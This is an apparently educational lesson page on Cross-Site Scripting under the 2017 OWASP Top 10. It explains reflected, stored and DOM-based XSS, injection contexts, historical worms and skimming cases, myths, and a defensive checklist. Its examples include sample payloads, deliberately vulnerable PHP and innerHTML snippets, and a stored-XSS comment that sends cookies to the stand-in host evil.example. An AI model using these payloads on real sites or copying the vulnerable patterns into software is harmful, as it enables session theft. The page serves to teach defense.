# A7:2017 – Cross-Site Scripting (XSS)

## Table of Contents

- [What is Cross-Site Scripting?](#what-is-cross-site-scripting)
- [Why Does XSS Matter?](#why-does-xss-matter)
- [Technical Context: The Three Types](#technical-context-the-three-types)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Detection](#prevalence-and-detection)
- [Common Misunderstandings](#common-misunderstandings)
- [A Note on the 2021 Edition](#a-note-on-the-2021-edition)
- [Self-Assessment](#self-assessment)

## What is Cross-Site Scripting?

**Cross-Site Scripting (XSS)** is a vulnerability that lets an attacker cause a victim's browser to execute attacker-controlled JavaScript in the security context of a trusted site. The browser cannot tell the difference between script the developer intended to send and script an attacker smuggled into the page — both arrive inside the same HTML document, from the same origin, and run with the same privileges.

That last point is what makes XSS dangerous. Because the injected code runs *as the site*, it inherits everything the site's own scripts can do: it can read the DOM, read non-`HttpOnly` cookies, call same-origin APIs with the victim's session, rewrite the page, and act on the user's behalf. The browser's Same-Origin Policy — the fundamental boundary that stops `evil.com` from reading `bank.com` — offers no protection here, because the malicious script *is* running as `bank.com`.

At its root, XSS is an **output-encoding failure**. Untrusted data (a URL parameter, a form field, a stored comment, a value read from the DOM) is written into a page without being transformed into an inert, context-appropriate representation. The data crosses the boundary from "text to display" to "code to execute," and the browser dutifully executes it.

### The Core Mechanism

```
1. Attacker crafts a payload:      <script>steal(document.cookie)</script>
2. Payload reaches the app:        via URL, form, stored record, or DOM source
3. App writes it into a page:      WITHOUT context-aware encoding
4. Victim's browser parses it:     as markup/script, not as text
5. Script executes as the origin:  full access to session, DOM, and APIs
```

The vulnerability is created at step 3 and exploited at step 4 — often on completely different machines, and, for stored XSS, at completely different times. The fix always lives at step 3: encode (or sanitize) untrusted data for the exact context into which it is placed.

## Why Does XSS Matter?

### Business Impact

- **Account Takeover**: Stealing a session cookie or token, or silently changing a victim's email/password through same-origin requests, hands the attacker the account — no password required.
- **Mass, Self-Propagating Compromise**: Stored XSS on a social feature can build a *worm* that spreads from profile to profile with every view, reaching enormous scale in hours (see Real-World Impact).
- **Payment and Data Theft**: Injected JavaScript on a checkout or login page can skim card numbers and credentials keystroke-by-keystroke ("formjacking") and exfiltrate them to an attacker server.
- **Brand and Trust Damage**: Defacement, forced redirects to malware or phishing, and fraudulent actions taken "by" the user all erode trust and invite regulatory scrutiny when personal data is exposed.
- **Regulatory Fallout**: XSS that exposes personal or payment data triggers GDPR, PCI-DSS, and similar obligations, including breach notification.

### Technical Impact

- **Session Hijacking**: Reading `document.cookie` (when cookies lack `HttpOnly`) or a token stored in `localStorage` lets the attacker impersonate the user.
- **CSRF-Token Theft & Request Forgery**: Same-origin script can read anti-CSRF tokens from the DOM and then issue authenticated state-changing requests, defeating CSRF defenses entirely.
- **Keylogging & UI Redress**: Injected code can attach event listeners to capture keystrokes, or overlay fake login prompts to harvest credentials.
- **Content & Behavior Manipulation**: The attacker can rewrite any part of the page — prices, links, forms — and reroute form submissions to their own endpoint.
- **Pivot to Deeper Attacks**: XSS is frequently the first link in a chain — bypassing CSRF protection, abusing an admin panel, or reaching internal APIs the victim's browser can see but the attacker cannot.

## Technical Context: The Three Types

XSS is traditionally classified by *where the untrusted data enters and where the injection is realized*. All three produce the same result — attacker script running as the origin — but they differ in delivery, persistence, and where the vulnerable code lives.

### 1. Reflected XSS

The payload travels in the request (typically a URL query parameter or form field) and is immediately "reflected" back in the response for that same request. Nothing is stored; the attack requires luring the victim into clicking a crafted link or submitting a crafted form.

```
Vulnerable (PHP):
    <h1>Results for: <?php echo $_GET['q']; ?></h1>

Attack URL:
    https://site.example/search?q=<script>steal(document.cookie)</script>

Delivered via: phishing email, malicious ad, or a link on another site.
```

### 2. Stored (Persistent) XSS

The payload is saved by the application — in a database, file, log, or cache — and later served to *every* user who views the affected page. No per-victim social engineering is needed: the trap is set once and springs on everyone who loads the content. This is the most dangerous class because it scales and can target privileged viewers (e.g., an admin reading a support ticket).

```
Attacker submits a comment:
    { "body": "<script>fetch('//evil.example/c?='+document.cookie)</script>" }

Stored verbatim, then rendered unescaped for all readers:
    <div class="comment"><script> ... </script></div>
```

### 3. DOM-Based XSS

The vulnerability is entirely in **client-side JavaScript**: a script reads data from an attacker-controllable *source* (e.g., `location.hash`, `location.search`, `document.referrer`, `postMessage` data) and passes it into a dangerous *sink* (e.g., `innerHTML`, `document.write`, `eval`) without sanitization. The malicious data may never reach the server at all — everything after the `#` in a URL, for example, is not sent — so server-side defenses and server logs never see it.

```
Vulnerable client code:
    element.innerHTML = "Hello " + location.hash.slice(1);

Attack URL:
    https://site.example/#<img src=x onerror=steal(document.cookie)>
```

> **Source → Sink is the mental model.** Every XSS is untrusted data flowing from a source to a sink that interprets it as code. Reflected and stored XSS realize the sink on the server (HTML written into the response); DOM XSS realizes it in the browser. Prevention means controlling that flow at the sink.

### Injection Contexts

Where the data lands inside the page determines which characters are dangerous and how it must be encoded. The same input can be harmless in one context and catastrophic in another — which is why "just escape `<` and `>`" is not enough.

| Context | Example location | What breaks out |
|---|---|---|
| HTML body | `<div>DATA</div>` | `< > &` start new tags |
| HTML attribute | `<input value="DATA">` | Quote closes the attribute; then `onX=` handlers |
| JavaScript | `var x = "DATA";` | Quote/backslash/newline break out of the string |
| URL | `<a href="DATA">` | `javascript:` scheme executes on click |
| CSS | `style="DATA"` | `expression()` (legacy), `url()` exfiltration |

## Real-World Impact

The following are well-documented *classes* of XSS incident. Details are described at a level that is publicly verifiable; treat any single figure as illustrative rather than exact.

### Case Class 1: The Self-Propagating Worm (MySpace "Samy", 2005)

**Pattern**: A stored XSS in a social-network profile carried JavaScript that, when any logged-in user viewed the infected profile, added the author as a friend *and copied itself onto the viewer's own profile* — a classic XSS worm. It reportedly spread to over a million profiles within roughly a day before the site was taken offline to clean up.

**Lesson**: Stored XSS on user-generated content is not a one-victim bug; it can become exponential. Sanitizing rich HTML and constraining what markup users may submit is essential wherever content is shown to other users.

### Case Class 2: Feed/Timeline Worms (TweetDeck, 2014)

**Pattern**: A stored XSS in a Twitter client caused specially crafted tweets to execute script in the browsers of users whose timelines displayed them, auto-retweeting and thereby self-propagating. The vendor briefly disabled the service to patch it.

**Lesson**: Any surface that renders other people's content — timelines, comments, chat, dashboards — is a stored-XSS surface. Client-side rendering of remote content needs the same rigor as server-side rendering.

### Case Class 3: Client-Side Skimming / Formjacking (Magecart-style, 2018–ongoing)

**Pattern**: Attackers inject JavaScript into checkout or payment pages — sometimes through a compromised third-party script — that quietly reads card numbers and personal data as the user types and posts them to an attacker server. Whether the entry point is stored XSS or a supply-chain compromise, the payload is the same class of same-origin script execution.

**Lesson**: A single injected script on a payment page can bleed data for months. A restrictive Content-Security-Policy that limits where scripts may load from and where the page may send data is a key mitigation for this class.

### Case Class 4: Stored XSS in Marketplace/Support Content

**Pattern**: Over the years, large marketplaces and SaaS tools have had stored XSS in listings, reviews, profile fields, or support tickets, letting an attacker's script run in the browser of any viewer — often specifically targeting the higher-privileged staff who review such content.

**Lesson**: The most valuable victim is frequently an administrator. Stored XSS that reaches an admin console can escalate to full application compromise.

## Prevalence and Detection

XSS has been among the most frequently reported web vulnerabilities for its entire history. In the 2017 OWASP Top 10 it was ranked **A7**, and OWASP characterized it as present in a large share of applications — driven by the sheer number of places where untrusted data is written into pages, and by frameworks that historically did not escape by default.

Rather than cite a single percentage (figures vary by dataset and year), the durable picture is:

- XSS is **highly prevalent and easy to introduce** — every unescaped output is a potential instance.
- It is **readily discoverable** by automated scanners for the reflected and stored variants, though DOM-based XSS often requires client-side taint analysis to find.
- Impact ranges from **nuisance to full account takeover and worm-scale spread**, depending on context and the value of the compromised session.
- Modern auto-escaping frameworks (React, Angular, modern template engines) have *reduced* classic server-side reflected XSS, shifting the balance toward **DOM-based XSS** and misuse of escape hatches like `dangerouslySetInnerHTML`.

> Note: exact prevalence numbers differ between OWASP data calls, bug-bounty reports, and vendor scans. The reliable takeaway is that XSS remains common, is cheap to introduce, and can be severe — so defenses must be systematic, not case-by-case.

## Common Misunderstandings

### Myth 1: "We filter out `<script>` tags, so we're safe."

**Reality**: Script executes from dozens of vectors that contain no `<script>` tag at all — `onerror`, `onload`, and other event-handler attributes; `javascript:` URLs; `<svg>` and `<iframe>` tricks; and more. Blacklist filtering is a losing game. Encode for the output context instead.

### Myth 2: "Validating input on the server prevents XSS."

**Reality**: Input validation is useful defense-in-depth, but XSS is fundamentally an *output* problem. The same stored value may be safe in a JSON API and lethal in an HTML page. Encoding must happen where the data is written, in the context it is written into.

### Myth 3: "It's only reflected XSS — the payload isn't stored, so it's low risk."

**Reality**: A reflected XSS link delivered by phishing or a malicious ad is a complete account-takeover primitive for anyone who clicks. "Not persistent" does not mean "not serious."

### Myth 4: "Our framework auto-escapes, so XSS is impossible."

**Reality**: Auto-escaping covers the common HTML-body case, but every framework has escape hatches (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `|safe`, `mark_safe`) and blind spots (URLs, inline event handlers, `<script>` blocks, DOM sinks). Auto-escaping is a strong default, not a guarantee.

### Myth 5: "HttpOnly cookies stop XSS."

**Reality**: `HttpOnly` stops the script from *reading the cookie*, which blocks one exfiltration path. It does nothing to stop the script from making authenticated same-origin requests, stealing CSRF tokens, keylogging, or defacing the page. It is a valuable mitigation, not a fix.

### Myth 6: "DOM XSS is a server bug we can patch server-side."

**Reality**: In pure DOM XSS the malicious data may never reach the server (e.g., it lives in the URL fragment after `#`). Only client-side code changes — avoiding dangerous sinks, using safe APIs like `textContent`, and adopting Trusted Types — can fix it.

## A Note on the 2021 Edition

This lesson uses the **2017** framing, where XSS is its own category, **A7:2017 – Cross-Site Scripting**. In the **2021** OWASP Top 10, XSS was *merged into **A03:2021 – Injection***, reflecting the view that XSS is injection into a browser parser, closely related to SQL and command injection. The vulnerability, mechanics, and defenses are unchanged — only the taxonomy moved. When you read modern material that lists Injection at A03, XSS is included there.

## Self-Assessment

Ask these questions about your application:

- [ ] Is every untrusted value encoded for its *specific* output context (HTML, attribute, JS, URL, CSS) at the point it is written?
- [ ] Do you rely on framework auto-escaping, and have you audited every escape hatch (`dangerouslySetInnerHTML`, `v-html`, `|safe`, `mark_safe`, `innerHTML`)?
- [ ] Is all rich, user-supplied HTML passed through a vetted sanitizer (e.g., DOMPurify) rather than a home-grown filter?
- [ ] Have you enumerated your DOM sinks (`innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location`) and confirmed no untrusted source flows into them?
- [ ] Is a Content-Security-Policy deployed with nonces or hashes (not `unsafe-inline`), ideally with `strict-dynamic`?
- [ ] Are session cookies marked `HttpOnly`, `Secure`, and `SameSite`?
- [ ] Are you considering Trusted Types to lock down DOM-XSS sinks?

If you answered "no" or "not sure" to several of these, you likely have exploitable XSS today.

## Next Steps

- **[Attack Vectors](attack-vectors.html)**: The contexts, sinks, and bypasses attackers use to land script
- **[Prevention](prevention.html)**: Layered, context-aware defenses with real code and config
- **[Examples](examples.html)**: Vulnerable vs. secure code across HTML/JS, PHP, Python, and Node
- **[Hands-On Lab](./lab/cross-site-scripting/)**: Practice finding and fixing XSS in a safe, isolated environment
